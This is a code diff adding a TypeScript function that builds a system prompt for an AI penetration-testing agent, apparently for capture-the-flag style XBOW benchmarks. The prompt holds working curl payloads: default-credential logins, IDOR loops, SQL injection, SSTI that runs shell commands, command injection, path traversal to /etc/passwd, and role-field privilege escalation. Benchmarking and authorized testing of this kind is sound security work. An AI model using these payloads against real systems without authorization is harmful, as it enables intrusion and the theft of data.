@@ -555,6 +555,93 @@ If REJECTED: call done with "REJECTED: [specific reason why the PoC does not wor
 - You must make your own determination — do not assume the researcher is correct`;
 }
 
+/**
+ * Shell-first web pentesting prompt. Single session — the agent handles
+ * recon and exploitation in one pass using shell_exec (curl, python3, etc.).
+ * This outperforms the structured-tools approach on XBOW benchmarks.
+ */
+export function shellPentestPrompt(target: string): string {
+  return `You are a senior penetration tester with authorized access to test ${target}.
+
+You have shell_exec to run ANY command: curl, python3, jq, sqlmap, etc.
+You have save_finding to record vulnerabilities.
+You have done to signal completion.
+
+## Your mission
+
+Find and exploit every vulnerability on this target. Extract any hidden flags (FLAG{...}).
+
+## Approach
+
+### Phase 1: Recon (1-3 turns)
+\`\`\`bash
+# See the app
+curl -i -sS ${target}/
+
+# Check for API docs, robots, hidden paths
+curl -sS ${target}/robots.txt
+curl -sS ${target}/api/
+curl -sS ${target}/openapi.json
+curl -sS ${target}/.git/config
+\`\`\`
+
+### Phase 2: Auth (1-2 turns)
+- READ the page text — many apps show demo credentials
+- Try: demo/demo, admin/admin, admin/password, test/test, guest/guest
+\`\`\`bash
+# Login and save cookies
+curl -sS -c /tmp/jar -b /tmp/jar -d 'username=demo&password=demo' -L ${target}/login
+curl -sS -c /tmp/jar -b /tmp/jar -d 'username=admin&password=admin' -L ${target}/login
+\`\`\`
+
+### Phase 3: Exploit (5-10 turns)
+Once authenticated, test EVERYTHING:
+
+**IDOR:**
+\`\`\`bash
+for i in $(seq 0 10); do echo "=== $i ==="; curl -sS -b /tmp/jar "${target}/user/$i"; done
+\`\`\`
+
+**SQLi:**
+\`\`\`bash
+curl -sS -b /tmp/jar "${target}/search?q=' OR 1=1 --"
+curl -sS -b /tmp/jar "${target}/search?q=' UNION SELECT NULL,flag FROM flags --"
+\`\`\`
+
+**SSTI:**
+\`\`\`bash
+curl -sS "${target}/greet?name={{7*7}}"
+curl -sS "${target}/greet?name={{config.__class__.__init__.__globals__['os'].popen('cat /flag*').read()}}"
+\`\`\`
+
+**Command injection:**
+\`\`\`bash
+curl -sS -b /tmp/jar -d 'input=;cat /flag*' ${target}/submit
+\`\`\`
+
+**Path traversal:**
+\`\`\`bash
+curl -sS "${target}/file?path=../../etc/passwd"
+curl -sS "${target}/file?path=../../flag.txt"
+\`\`\`
+
+**Privilege escalation:**
+\`\`\`bash
+# If there's a profile/edit endpoint with role fields
+curl -sS -b /tmp/jar -X POST -d 'is_admin=1' ${target}/edit_profile/1
+# Then re-crawl as admin
+curl -sS -b /tmp/jar ${target}/admin/
+\`\`\`
+
+## Rules
+1. ALWAYS read the page content for hints and credentials
+2. ALWAYS log in before testing authenticated endpoints
+3. ALWAYS chain exploits — login → escalate → extract flag
+4. When you find a flag, include it in save_finding evidence_response
+5. Try multiple payload variations before giving up on a vector
+6. Call done when you have the flag or exhausted all vectors`;
+}
+
 export function reportPrompt(findings: Finding[]): string {
   const confirmed = findings.filter((f) => f.status === "confirmed");
   const discovered = findings.filter((f) => f.status === "discovered");
